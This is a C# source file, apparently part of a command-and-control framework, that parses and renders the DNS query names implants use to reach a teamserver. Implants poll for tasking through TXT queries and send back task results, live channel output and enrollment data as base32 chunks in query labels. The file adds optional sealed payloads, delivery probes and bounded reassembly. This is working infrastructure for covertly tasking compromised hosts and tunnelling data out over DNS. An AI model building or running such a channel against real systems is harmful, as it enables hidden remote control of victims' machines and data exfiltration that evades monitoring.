using System.Collections.Concurrent;
using Rod.CoreState;

namespace Rod.Transport.Listeners.Dns;

// The DNS contact name grammar (architecture.md Sec 8, the DNS listener's
// contract, documented for implant authors in extending/implants.md). Every
// contact is a TXT query under the listener's zone -- the listener's public
// endpoint, a domain the teamserver answers for. The query NAME carries the
// implant's message, base32-encoded into labels (DNS labels are case-
// insensitive; the encoding is lowercase RFC 4648 without padding):
//
//   poll (presence + fetch next tasking):
//     p.<b32(implant id)>.<zone>
//
//   key-named poll (the sealed carriage, an artifact whose build baked an
//   envelope key): the poll names the key id, so the answer is sealed under
//   that key -- the raw R1 AES-GCM body, base32 like every TXT payload here:
//     k.<b32(implant id)>.<b32(key id)>.<zone>
//
//   result chunk (report a task's outcome, short outputs only):
//     r.<b32(task id)>.<outcome s|f>.<seq>.<terminal t|m>.<b32(chunk)>.<b32(implant id)>.<zone>
//
//   delivery probe (did my result or channel output for this task land?):
//     n.<b32(task id)>.<b32(sha128 of the plaintext)>.<b32(implant id)>.<zone>
//   answered TXT y/n -- the retransmission half: a lost chunk drops the
//   reassembly server-side, so the sender keeps the frame pending until
//   the probe confirms its blob landed (first-wins makes the re-send
//   idempotent).
//
// A poll is answered with zero or one TXT record whose strings concatenate to
// the base32 of a signed rod.v1 TaskRequest; a result is answered with an
// empty NOERROR answer. The chunk sequence is 0-origin decimal; the terminal
// flag closes the reassembly. Short-argument tasking only: a TaskRequest that
// does not fit the DNS budget is not claimed over this transport.
//
// Sealing (an artifact with a baked envelope key, the same posture the web
// envelope contacts carry): the k-poll's answer and the r/c chunks wrap their
// payloads as raw R1 bodies under purpose-specific AADs, so the resolver chain
// reads no frame bytes in the clear; a p-poll from a key-bound implant is
// answered empty (the downgrade refusal -- plaintext tasking is not handed to
// an artifact known to carry a key), and a plaintext r/c reassembly from one
// is dropped the same way.

/// <summary>
/// Parses and renders the contact query names. Pure grammar, no I/O -- the
/// listener service and the tests share one definition.
/// </summary>
internal static class DnsContactNames
{
    /// <summary>A poll: the implant's presence ping and task fetch.</summary>
    internal sealed record Poll(ImplantId Implant);

    /// <summary>
    /// A key-named poll: the same presence ping and task fetch, with the
    /// artifact's envelope key id riding the name so the answer seals under
    /// that key -- the resolver chain reads no tasking bytes in the clear.
    /// </summary>
    internal sealed record SealedPoll(ImplantId Implant, Guid KeyId);

    /// <summary>One chunk of a task result the implant reports back.</summary>
    internal sealed record ResultChunk(
        ImplantId Implant,
        TaskId Task,
        Rod.CoreState.Tasks.TaskOutcome Outcome,
        int Sequence,
        bool Terminal,
        byte[] Chunk);

    /// <summary>
    /// One chunk of a live channel's output (architecture.md Sec 10.3, the
    /// store-and-forward carriage over DNS): the chunks reassemble into one
    /// marshaled ChannelOutput message.
    /// </summary>
    internal sealed record ChannelChunk(
        ImplantId Implant,
        TaskId Task,
        int Sequence,
        bool Terminal,
        byte[] Chunk);

    /// <summary>
    /// One chunk of an enrollment upload (architecture.md Sec 8, enrollment
    /// over DNS): the client-chosen stream id keys the reassembly, the
    /// terminal chunk assembles the (sealed or plaintext) enroll body.
    /// </summary>
    internal sealed record EnrollChunk(byte[] Stream, int Sequence, bool Terminal, byte[] Chunk);

    /// <summary>One probe of an enrollment answer: a token, a chunk index.</summary>
    internal sealed record EnrollAnswerProbe(byte[] Token, int Sequence);

    /// <summary>
    /// One delivery probe: the task the sender reported to, and the first 16
    /// bytes of SHA-256 over the report's plaintext -- the identity of the
    /// exact blob whose landing the sender asks about.
    /// </summary>
    internal sealed record DeliveryProbe(ImplantId Implant, TaskId Task, byte[] Sha);

    /// <summary>
    /// Parses a query name against <paramref name="zone"/>. Returns the poll
    /// or result-chunk view, or null when the name is not a contact under
    /// this zone (other names in the zone are answered NXDOMAIN by the
    /// listener, not parsed here).
    /// </summary>
    public static Poll? TryParsePoll(string name, string zone)
    {
        if (!TryStripZone(name, zone, out var labels))
            return null;
        if (labels.Length != 2 || labels[0] != "p")
            return null;
        if (!TryDecodeId(labels[1], out var implant))
            return null;
        return new Poll(implant);
    }

    /// <summary>
    /// Parses a key-named poll against <paramref name="zone"/>:
    /// k.&lt;b32(implant id)&gt;.&lt;b32(key id)&gt;. The key id is the raw
    /// 16-byte guid form, the same bytes the baked key packs.
    /// </summary>
    public static SealedPoll? TryParseSealedPoll(string name, string zone)
    {
        if (!TryStripZone(name, zone, out var labels))
            return null;
        if (labels.Length != 3 || labels[0] != "k")
            return null;
        if (!TryDecodeId(labels[1], out var implant))
            return null;
        if (!TryDecode(labels[2], out var keyBytes) || keyBytes.Length != 16)
            return null;
        return new SealedPoll(implant, new Guid(keyBytes));
    }

    public static ResultChunk? TryParseResult(string name, string zone)
    {
        if (!TryStripZone(name, zone, out var labels))
            return null;
        if (labels.Length != 7 || labels[0] != "r")
            return null;
        if (!TryDecodeId(labels[6], out var implant))
            return null;
        if (!TryDecode(labels[1], out var taskBytes)
            || !TaskId.TryParse(System.Text.Encoding.UTF8.GetString(taskBytes), out var task))
            return null;

        var outcome = labels[2] switch
        {
            "s" => Rod.CoreState.Tasks.TaskOutcome.Succeeded,
            "f" => Rod.CoreState.Tasks.TaskOutcome.Failed,
            _ => (Rod.CoreState.Tasks.TaskOutcome?)null,
        };
        var terminal = labels[4] switch
        {
            "t" => true,
            "m" => false,
            _ => (bool?)null,
        };
        if (outcome is null || terminal is null || !int.TryParse(labels[3], out var sequence) || sequence < 0)
            return null;

        // An empty chunk rides as the bare label "e": base32 of zero bytes
        // would render an empty label, which a DNS name cannot carry.
        var chunk = labels[5] == "e"
            ? Array.Empty<byte>()
            : TryDecode(labels[5], out var decoded) ? decoded : null;
        if (chunk is null)
            return null;

        return new ResultChunk(implant, task, outcome.Value, sequence, terminal.Value, chunk);
    }

    /// <summary>
    /// Parses a channel-output chunk against <paramref name="zone"/>:
    /// c.&lt;task&gt;.&lt;seq&gt;.&lt;t|m&gt;.&lt;chunk&gt;.&lt;implant&gt;.
    /// </summary>
    public static ChannelChunk? TryParseChannel(string name, string zone)
    {
        if (!TryStripZone(name, zone, out var labels))
            return null;
        if (labels.Length != 6 || labels[0] != "c")
            return null;
        if (!TryDecodeId(labels[5], out var implant))
            return null;
        if (!TryDecode(labels[1], out var taskBytes)
            || !TaskId.TryParse(System.Text.Encoding.UTF8.GetString(taskBytes), out var task))
            return null;
        var terminal = labels[3] switch
        {
            "t" => true,
            "m" => false,
            _ => (bool?)null,
        };
        if (terminal is null || !int.TryParse(labels[2], out var sequence) || sequence < 0)
            return null;
        var chunk = labels[4] == "e"
            ? Array.Empty<byte>()
            : TryDecode(labels[4], out var decoded) ? decoded : null;
        if (chunk is null)
            return null;
        return new ChannelChunk(implant, task, sequence, terminal.Value, chunk);
    }

    /// <summary>Renders a poll name (the implant-side twin of the parser).</summary>
    public static string PollName(ImplantId implant, string zone)
        => $"p.{Encode(implant.ToString())}.{zone}";

    /// <summary>
    /// Renders a key-named poll (the implant-side twin of the parser): the
    /// key id rides as its raw 16 guid bytes, base32 like every label.
    /// </summary>
    public static string SealedPollName(ImplantId implant, Guid keyId, string zone)
        => $"k.{Encode(implant.ToString())}.{Encode(keyId.ToByteArray())}.{zone}";

    /// <summary>Renders a result-chunk name under <paramref name="zone"/>.</summary>
    public static string ResultName(
        ImplantId implant, TaskId task, bool succeeded, int sequence, bool terminal, byte[] chunk, string zone)
        => "r." + Encode(task.ToString())
            + "." + (succeeded ? "s" : "f")
            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
            + "." + (terminal ? "t" : "m")
            + "." + (chunk.Length == 0 ? "e" : Encode(chunk))
            + "." + Encode(implant.ToString())
            + "." + zone;

    /// <summary>
    /// Renders a channel-output chunk name (the implant-side twin of the
    /// parser): c.&lt;task&gt;.&lt;seq&gt;.&lt;t|m&gt;.&lt;chunk&gt;.&lt;implant&gt;.
    /// </summary>
    public static string ChannelName(
        ImplantId implant, TaskId task, int sequence, bool terminal, byte[] chunk, string zone)
        => "c." + Encode(task.ToString())
            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
            + "." + (terminal ? "t" : "m")
            + "." + (chunk.Length == 0 ? "e" : Encode(chunk))
            + "." + Encode(implant.ToString())
            + "." + zone;

    /// <summary>
    /// Parses an enrollment-upload chunk against <paramref name="zone"/>:
    /// e.&lt;stream&gt;.&lt;seq&gt;.&lt;t|m&gt;.&lt;chunk&gt;.
    /// </summary>
    public static EnrollChunk? TryParseEnroll(string name, string zone)
    {
        if (!TryStripZone(name, zone, out var labels))
            return null;
        if (labels.Length != 5 || labels[0] != "e")
            return null;
        if (!TryDecode(labels[1], out var stream) || stream.Length == 0)
            return null;
        var terminal = labels[3] switch
        {
            "t" => true,
            "m" => false,
            _ => (bool?)null,
        };
        if (terminal is null || !int.TryParse(labels[2], out var sequence) || sequence < 0)
            return null;
        var chunk = labels[4] == "e"
            ? Array.Empty<byte>()
            : TryDecode(labels[4], out var decoded) ? decoded : null;
        if (chunk is null)
            return null;
        return new EnrollChunk(stream, sequence, terminal.Value, chunk);
    }

    /// <summary>
    /// Parses an enrollment-answer probe against <paramref name="zone"/>:
    /// a.&lt;token&gt;.&lt;seq&gt;.
    /// </summary>
    public static EnrollAnswerProbe? TryParseEnrollAnswer(string name, string zone)
    {
        if (!TryStripZone(name, zone, out var labels))
            return null;
        if (labels.Length != 3 || labels[0] != "a")
            return null;
        if (!TryDecode(labels[1], out var token) || token.Length == 0)
            return null;
        if (!int.TryParse(labels[2], out var sequence) || sequence < 0)
            return null;
        return new EnrollAnswerProbe(token, sequence);
    }

    /// <summary>
    /// Renders an enrollment-upload chunk name (the implant-side twin of
    /// the parser).
    /// </summary>
    public static string EnrollName(byte[] stream, int sequence, bool terminal, byte[] chunk, string zone)
        => "e." + Encode(stream)
            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
            + "." + (terminal ? "t" : "m")
            + "." + (chunk.Length == 0 ? "e" : Encode(chunk))
            + "." + zone;

    /// <summary>Renders an enrollment-answer probe name.</summary>
    public static string EnrollAnswerName(byte[] token, int sequence, string zone)
        => "a." + Encode(token)
            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
            + "." + zone;

    /// <summary>
    /// Parses a delivery probe against <paramref name="zone"/>:
    /// n.&lt;b32(task id)&gt;.&lt;b32(sha128)&gt;.&lt;b32(implant id)&gt;.
    /// </summary>
    public static DeliveryProbe? TryParseDelivery(string name, string zone)
    {
        if (!TryStripZone(name, zone, out var labels))
            return null;
        if (labels.Length != 4 || labels[0] != "n")
            return null;
        if (!TryDecodeId(labels[3], out var implant))
            return null;
        if (!TryDecode(labels[1], out var taskBytes)
            || !TaskId.TryParse(System.Text.Encoding.UTF8.GetString(taskBytes), out var task))
            return null;
        if (!TryDecode(labels[2], out var sha) || sha.Length == 0 || sha.Length > 32)
            return null;
        return new DeliveryProbe(implant, task, sha);
    }

    /// <summary>
    /// Renders a delivery probe name (the implant-side twin of the parser).
    /// </summary>
    public static string ProbeName(ImplantId implant, TaskId task, byte[] sha, string zone)
        => "n." + Encode(task.ToString())
            + "." + Encode(sha)
            + "." + Encode(implant.ToString())
            + "." + zone;

    /// <summary>
    /// The delivery probe's blob identity: the first 16 SHA-256 bytes over
    /// the report's plaintext, the value both sender and server can compute.
    /// </summary>
    public static byte[] DeliverySha(byte[] plaintext)
        => System.Security.Cryptography.SHA256.HashData(plaintext)[..16];

    /// <summary>The zone label suffix a name must end with, case-insensitive.</summary>
    private static bool TryStripZone(string name, string zone, out string[] labels)
    {
        labels = Array.Empty<string>();
        if (!name.EndsWith(zone, StringComparison.OrdinalIgnoreCase))
            return false;
        var head = name[..^zone.Length].TrimEnd('.');
        if (head.Length == 0)
            return false;
        labels = head.Split('.');
        return labels.Length > 0 && labels[0] is "p" or "k" or "r" or "c" or "e" or "a" or "n";
    }

    private static bool TryDecodeId(string label, out ImplantId implant)
    {
        implant = default;
        if (!TryDecode(label, out var raw))
            return false;
        if (!Guid.TryParse(System.Text.Encoding.UTF8.GetString(raw), out var value))
            return false;
        implant = new ImplantId(value);
        return true;
    }

    /// <summary>Lowercase RFC 4648 base32 without padding.</summary>
    public static string Encode(byte[] bytes)
        => Base32Lower(bytes);

    /// <summary>Encodes a UTF-8 string's bytes.</summary>
    public static string Encode(string text)
        => Base32Lower(System.Text.Encoding.UTF8.GetBytes(text));

    /// <summary>Decodes base32 (either case, padding tolerated).</summary>
    public static bool TryDecode(string text, out byte[] bytes)
    {
        try
        {
            bytes = System.Convert.FromHexString(ToHex(text));
            return true;
        }
        catch (FormatException)
        {
            bytes = Array.Empty<byte>();
            return false;
        }
    }

    // Base32 decode without System.Buffers.Text base32 support (the BCL has
    // none): map the RFC 4648 alphabet back to bits via a hex intermediate.
    private static string ToHex(string text)
    {
        var clean = text.TrimEnd('=').ToUpperInvariant();
        var bits = 0;
        var bitCount = 0;
        var hex = new System.Text.StringBuilder(clean.Length);
        foreach (var c in clean)
        {
            var value = c switch
            {
                >= 'A' and <= 'Z' => c - 'A',
                >= '2' and <= '7' => c - '2' + 26,
                _ => throw new FormatException("Not base32."),
            };
            bits = (bits << 5) | value;
            bitCount += 5;
            if (bitCount >= 8)
            {
                bitCount -= 8;
                hex.Append(((bits >> bitCount) & 0xFF).ToString("X2"));
            }
        }
        // Trailing partial bits are padding, not data; the encoder never emits
        // them, so a clean multiple of 40 bits decodes losslessly.
        return hex.ToString();
    }

    private static string Base32Lower(byte[] bytes)
    {
        const string alphabet = "abcdefghijklmnopqrstuvwxyz234567";
        var sb = new System.Text.StringBuilder((bytes.Length * 8 + 4) / 5);
        var bits = 0;
        var bitCount = 0;
        foreach (var b in bytes)
        {
            bits = (bits << 8) | b;
            bitCount += 8;
            while (bitCount >= 5)
            {
                bitCount -= 5;
                sb.Append(alphabet[(bits >> bitCount) & 0x1F]);
            }
        }
        if (bitCount > 0)
            sb.Append(alphabet[(bits << (5 - bitCount)) & 0x1F]);
        return sb.ToString();
    }

    /// <summary>
    /// The bounded reassembly buffer for result chunks: per-task chunk maps
    /// with a total-size cap and an entry cap so a spoofed flood cannot grow
    /// the listener without bound. Entries vanish on completion or when the
    /// caps push them out.
    /// </summary>
    internal sealed class ResultReassembler
    {
        private readonly ConcurrentDictionary<TaskId, ConcurrentDictionary<int, byte[]>> _byTask = new();
        private readonly ConcurrentDictionary<TaskId, int> _bytesByTask = new();

        // The per-task output ceiling, sealed overhead included: a keyed
        // artifact's blob is plaintext plus the R1 body's fixed 46 bytes, so
        // the cap keeps the same plaintext capacity it always had.
        public const int MaxTaskBytes = 4 * 1024 + 64;
        public const int MaxTasks = 256;

        /// <summary>
        /// Adds a chunk; on the terminal chunk, returns the concatenated
        /// output when the sequence is contiguous 0..n, else null (the
        /// reassembly is dropped). Non-terminal adds return null.
        /// </summary>
        public byte[]? Add(TaskId task, int sequence, bool terminal, byte[] chunk)
        {
            var chunks = _byTask.GetOrAdd(task, _ => new ConcurrentDictionary<int, byte[]>());
            var total = _bytesByTask.AddOrUpdate(task, chunk.Length, (_, soFar) => soFar + chunk.Length);
            if (total > MaxTaskBytes || _byTask.Count > MaxTasks)
            {
                _byTask.TryRemove(task, out _);
                _bytesByTask.TryRemove(task, out _);
                return null;
            }
            chunks[sequence] = chunk;

            if (!terminal)
                return null;

            _byTask.TryRemove(task, out _);
            _bytesByTask.TryRemove(task, out _);
            if (!TryConcatenate(chunks, out var output))
                return null;
            return output;
        }

        private static bool TryConcatenate(ConcurrentDictionary<int, byte[]> chunks, out byte[] output)
        {
            output = Array.Empty<byte>();
            var ordered = chunks.Keys.OrderBy(k => k).ToArray();
            if (ordered.Length == 0 || ordered[0] != 0 || ordered[^1] != ordered.Length - 1)
                return false; // not contiguous from zero: a chunk went missing
            var total = ordered.Sum(k => chunks[k].Length);
            var buffer = new byte[total];
            var offset = 0;
            foreach (var k in ordered)
            {
                chunks[k].CopyTo(buffer, offset);
                offset += chunks[k].Length;
            }
            output = buffer;
            return true;
        }
    }
}
